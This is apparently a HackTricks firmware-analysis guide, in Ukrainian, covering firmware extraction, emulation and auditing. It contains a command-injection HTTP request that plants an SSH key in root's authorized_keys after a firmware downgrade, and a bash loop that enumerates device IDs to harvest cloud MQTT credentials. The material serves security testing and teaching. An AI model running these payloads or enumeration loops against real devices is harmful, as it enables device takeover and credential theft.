# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Прошивка — це важливе програмне забезпечення, яке дозволяє пристроям працювати коректно, керуючи та забезпечуючи взаємодію між апаратними компонентами та програмним забезпеченням, з яким взаємодіє користувач. Вона зберігається в постійній пам'яті, що гарантує доступ пристрою до необхідних інструкцій від моменту ввімкнення й до запуску операційної системи. Дослідження та потенційна модифікація прошивки — критично важливий крок у виявленні вразливостей безпеки.

## **Збирання інформації**

**Збирання інформації** — критичний початковий етап для розуміння складу пристрою та технологій, які він використовує. Цей процес включає збір даних про:

- Архітектуру CPU та операційну систему, яка на ньому працює
- Відомості про bootloader
- Розташування апаратних компонентів та datasheets
- Метрики кодової бази та місця знаходження вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень та регуляторні сертифікати
- Діаграми архітектури та потоку
- Оцінки безпеки та виявлені вразливості

Для цього незамінні інструменти **open-source intelligence (OSINT)**, а також аналіз будь-яких доступних компонентів open-source ПЗ вручну та автоматизовано. Інструменти, такі як [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Отримання прошивки можна здійснити різними способами, кожен із яких має свій рівень складності:

- **Безпосередньо** від джерела (розробники, виробники)
- **Збираючи** її за наданими інструкціями
- **Завантаження** з офіційних сайтів підтримки
- Використовуючи **Google dork** запити для пошуку розміщених файлів прошивки
- Прямий доступ до **cloud storage**, за допомогою інструментів, таких як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплення оновлень за допомогою man-in-the-middle технік
- **Витягування** з пристрою через інтерфейси, такі як **UART**, **JTAG**, або **PICit**
- **Sniffing** запитів оновлення у комунікаціях пристрою
- Виявлення та використання **hardcoded update endpoints**
- **Dumping** з bootloader або мережі
- **Виймання та читання** чіпа пам'яті, коли інші методи не спрацювали, із використанням відповідних апаратних інструментів

## Аналіз прошивки

Тепер, коли ви **маєте прошивку**, потрібно витягти з неї інформацію, щоб знати, як її досліджувати. Ось різні інструменти, які можна для цього використовувати:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо вам не вдалося знайти багато за допомогою цих інструментів, перевірте **entropy** образу командою `binwalk -E <bin>` — якщо entropy низька, то, ймовірно, він не зашифрований. Якщо entropy висока, швидше за все зашифрований (або стиснутий якимось чином).

Крім того, ви можете використовувати ці інструменти для витягання **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для огляду файлу.

### Отримання файлової системи

За допомогою згаданих вище інструментів, наприклад `binwalk -ev <bin>`, ви повинні були змогти **витягти файлову систему**.\
Binwalk зазвичай розпаковує її у **папку з назвою типу файлової системи**, яка зазвичай є однією з наступних: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягнення файлової системи

Іноді binwalk **не має магічного байта файлової системи у своїх сигнатурах**. У таких випадках використайте binwalk, щоб **знайти offset файлової системи і carve стиснену файлову систему** з бінарного файлу та **вручну витягнути** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть наступну **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використано в прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії `squashfs-root`.

- Для CPIO архівів

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs з NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз прошивки

Отримавши прошивку, необхідно її розібрати, щоб зрозуміти структуру та можливі вразливості. Цей процес включає використання різних інструментів для аналізу та вилучення корисних даних із образу прошивки.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкового огляду бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати бінарні дані та з'ясувати інформацію про розділи і файлові системи:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для витягування **вбудованих файлів** рекомендуються інструменти й ресурси, такі як документація **file-data-carving-recovery-tools** та **binvis.io** для інспекції файлів.

### Витягнення файлової системи

Використовуючи `binwalk -ev <bin>`, зазвичай можна витягти файлову систему, часто в каталог з назвою типу файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не в змозі розпізнати тип файлової системи через відсутність magic bytes, потрібне ручне витягування. Це включає використання `binwalk` для знаходження offset файлової системи, після чого застосовують команду `dd` для вирізання файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного витягання вмісту використовуються різні команди.

### Аналіз файлової системи

Після витягнення файлової системи починається пошук вразливостей. Увага приділяється вразливим мережевим демонам, жорстко вбудованим обліковим даним, кінцевим точкам API, функціям сервера оновлень, нескомпільованому коду, скриптам запуску та скомпільованим бінарним файлам для офлайн-аналізу.

**Ключові розташування** та **елементи** для перевірки включають:

- **etc/shadow** та **etc/passwd** для облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на предмет потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Поширені веб-сервери та бінарні файли IoT-пристроїв

Кілька інструментів допомагають виявляти конфіденційну інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для всебічного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), та [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарних файлів

Як вихідний код, так і скомпільовані бінарні файли, знайдені у файловій системі, повинні бути ретельно перевірені на вразливості. Інструменти, такі як **checksec.sh** для Unix-бінарних файлів і **PESecurity** для Windows-бінарних файлів, допомагають виявляти незахищені бінарні файли, які можуть бути експлуатовані.

## Збирання cloud config та MQTT-креденціалів через похідні URL-токени

Багато IoT-хабів отримують конфігурацію пристрою з хмарної кінцевої точки, яка виглядає так:

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки ви можете виявити, що `<token>` обчислюється локально з deviceId з використанням жорстко вбудованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений як hex у верхньому регістрі

Такий підхід дозволяє будь-кому, хто дізнається deviceId та STATIC_KEY, відтворити URL і витягнути cloud config, часто розкриваючи незашифровані MQTT-креденціали та префікси тем.

Практичний робочий процес:

1) Витягнути deviceId із UART boot-логів

- Підключіть 3.3V UART adapter (TX/RX/GND) та захопіть логи:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, які виводять шаблон URL конфігурації хмари та адресу брокера, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновлення STATIC_KEY та алгоритму token з firmware

- Завантажте бінарники в Ghidra/radare2 і пошукайте шлях конфігурації ("/pf/") або використання MD5.
- Підтвердіть алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Отримайте token у Bash і приведiть digest до верхнього регістру:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Зібрати cloud config та MQTT credentials

- Складіть URL і отримайте JSON за допомогою curl; розпарсіть за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживати незашифрованим MQTT і слабкими ACLs для тем (якщо наявні)

- Використовуйте відновлені облікові дані, щоб підписатися на теми обслуговування і шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перебір передбачуваних device IDs (у масштабі, з авторизацією)

- Багато екосистем вбудовують vendor OUI/product/type bytes, після чого йде послідовний суфікс.
- Програмно можна перебирати candidate IDs, отримувати tokens та завантажувати configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробами mass enumeration.
- Віддавайте перевагу emulation або static analysis для відновлення секретів без модифікації цільового обладнання, коли це можливо.

Процес емулювання прошивки дозволяє проводити **dynamic analysis** як роботи пристрою, так і окремої програми. Такий підхід може стикатися з проблемами через залежності від hardware або architecture, але перенесення root filesystem або конкретних binaries на пристрій з відповідною архітектурою та endianness, наприклад Raspberry Pi, або на pre-built virtual machine, може полегшити подальше тестування.

### Емуляція окремих binaries

При дослідженні окремих програм важливо визначити endianness та CPU architecture програми.

#### Приклад для архітектури MIPS

Щоб емулювати binary для архітектури MIPS, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарників підходить `qemu-mipsel`.

#### Емуляція архітектури ARM

Для ARM бінарників процес аналогічний — використовується емулятор `qemu-arm`.

### Full System Emulation

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, полегшують повну емуляцію прошивки, автоматизують процес і допомагають у динамічному аналізі.

## Динамічний аналіз на практиці

На цьому етапі для аналізу використовується або реальний пристрій, або емульоване середовище. Важливо зберігати доступ до shell ОС та файлової системи. Емуляція може не повністю відтворювати взаємодію з апаратним забезпеченням, тому іноді потрібно перезапускати емуляцію. Аналіз має включати повторне дослідження файлової системи, перевірку вразливих веб-сторінок і мережевих сервісів, а також пошук уразливостей у bootloader. Тести цілісності прошивки критичні для виявлення можливих бекдорів.

## Техніки runtime-аналізу

Runtime-аналіз передбачає взаємодію з процесом або бінарником у його робочому середовищі з використанням інструментів, таких як gdb-multiarch, Frida та Ghidra, для встановлення breakpoint'ів і виявлення вразливостей за допомогою fuzzing та інших технік.

## Binary Exploitation and Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння цільової архітектури та програмування на низькорівневих мовах. Binary runtime protections у embedded-системах зустрічаються рідко, але коли вони є, можуть знадобитися техніки типу Return Oriented Programming (ROP).

## Попередньо налаштовані операційні системи для аналізу прошивок

Операційні системи, такі як [AttifyOS](https://github.com/adi0x90/attifyos) та [EmbedOS](https://github.com/scriptingxss/EmbedOS), пропонують попередньо налаштовані середовища для тестування безпеки прошивок, оснащені необхідними інструментами.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — дистрибутив, призначений допомогти вам виконувати security assessment та penetration testing пристроїв Internet of Things (IoT). Він економить багато часу, надаючи попередньо налаштоване середовище з усіма необхідними інструментами.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли виробник реалізує криптографічну перевірку підписів для образів прошивки, **захист від відкату версій (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим публічним ключем, але не порівнює *версію* (або монотонний лічильник) образу, що прошивається, атакуючий може легітимно встановити **старішу, вразливу прошивку, яка все ще має дійсний підпис**, і тим самим повторно ввести виправлені вразливості.

Типовий сценарій атаки:

1. **Obtain an older signed image**
* Завантажити його з публічного порталу завантажень виробника, CDN або сайту підтримки.
* Витягти його з мобільних/десктопних супровідних додатків (наприклад, всередині Android APK під `assets/firmware/`).
* Отримати його з репозиторіїв third-party, таких як VirusTotal, інтернет-архіви, форуми тощо.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Багато consumer IoT пристроїв відкривають *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх server-side і запускають recovery/upgrade.
3. Після відкату використати вразливість, яка була виправлена в новішому релізі (наприклад, фільтр від command-injection, який був доданий пізніше).
4. За потреби прошити назад останній образ або вимкнути оновлення, щоб уникнути виявлення після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженої версії) прошивці параметр `md5` конкатенується безпосередньо в shell-команду без санітизації, що дозволяє ін'єкцію довільних команд (тут — надання SSH key-based root access). У пізніших версіях прошивки ввели базовий фільтр символів, але відсутність захисту від пониження версії зводить це виправлення нанівець.

### Витягнення прошивки з мобільних додатків

Багато вендорів включають повні образи прошивки в свої супровідні мобільні додатки, щоб додаток міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються незашифрованими в APK/APEX під шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти, такі як `apktool`, `ghidra`, або навіть звичайний `unzip`, дозволяють витягти підписані образи без доступу до фізичного обладнання.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Чекліст для оцінки логіки оновлення

* Чи захищено належним чином транспорт/автентифікацію *update endpoint* (TLS + authentication)?
* Чи порівнює пристрій **version numbers** або **monotonic anti-rollback counter** перед прошивкою?
* Чи перевіряється образ в межах secure boot chain (наприклад, signatures checked by ROM code)?
* Чи виконує userland code додаткові перевірки (наприклад, allowed partition map, model number)?
* Чи повторно використовують потоки оновлення *partial* або *backup* ту саму логіку валідації?

> 💡  Якщо будь-яке з вищезгаданого відсутнє, платформа, ймовірно, уразлива до rollback-атак.

## Vulnerable firmware to practice

Щоб практикуватися у пошуку вразливостей у firmware, використайте наступні вразливі firmware-проекти як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Тренінги та сертифікації

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
